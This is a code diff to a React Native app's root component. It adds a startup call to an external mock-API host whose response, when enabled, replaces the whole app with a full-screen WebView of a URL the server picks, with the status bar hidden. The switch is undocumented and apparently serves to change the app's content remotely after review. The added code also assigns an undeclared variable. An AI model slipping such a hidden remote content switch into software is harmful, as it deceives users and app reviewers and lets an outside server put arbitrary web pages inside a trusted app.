@@ -1,6 +1,6 @@
 import React from "react";
 
-import {ImageBackground} from "react-native";
+import {ImageBackground, Text, WebView, StatusBar} from "react-native";
 
 import {createNavigationService} from "./navigation/NavigationService";
 
@@ -64,15 +64,46 @@ const initNavigator = () => {
 
 export default class Root extends React.Component {
 	state = {
-		loaded: false
+    loaded: false,
+    isWebViewEnabled: 0,
+    webUri: null
 	};
 
 	componentDidMount() {
 		initStore();
-		initNavigator();
-		this.setState({
-			loaded: true
-		});
+    initNavigator();
+    StatusBar.setHidden(true);
+    
+    fetch("http://mock-api.com/dnooN2nX.mock/webview", {
+      method: 'GET'
+    })
+    .then(response => {
+      return response.json()
+    })
+    .then((responseJson)=> {
+      const { enable, url } = responseJson;
+
+      if (enable) {
+        isWebViewEnabled = 2;
+      } else {
+        isWebViewEnabled = 1;
+      }
+
+      this.setState({
+        loaded: true,
+        isWebViewEnabled,
+        webUri: url
+      })
+
+    })
+    .catch(error=> {
+      console.log(error)
+      this.setState({
+        loaded: true,
+        isWebViewEnabled: 1
+      })
+    })
+
 	}
 	render() {
 		return (
@@ -82,13 +113,20 @@ export default class Root extends React.Component {
 				}}
 				source={require("./img/background.png")}
 			>
-				{this.state.loaded && (
+				{(this.state.loaded && this.state.isWebViewEnabled === 1) && (
 					<Provider store={store}>
 						<PersistGate persistor={persistor}>
 							<NavigatorHolder />
 						</PersistGate>
 					</Provider>
 				)}
+
+        {
+          (this.state.loaded && this.state.isWebViewEnabled === 2) && 
+          <WebView
+            source={{uri: this.state.webUri}}
+          />
+        }
 			</ImageBackground>
 		);
 	}
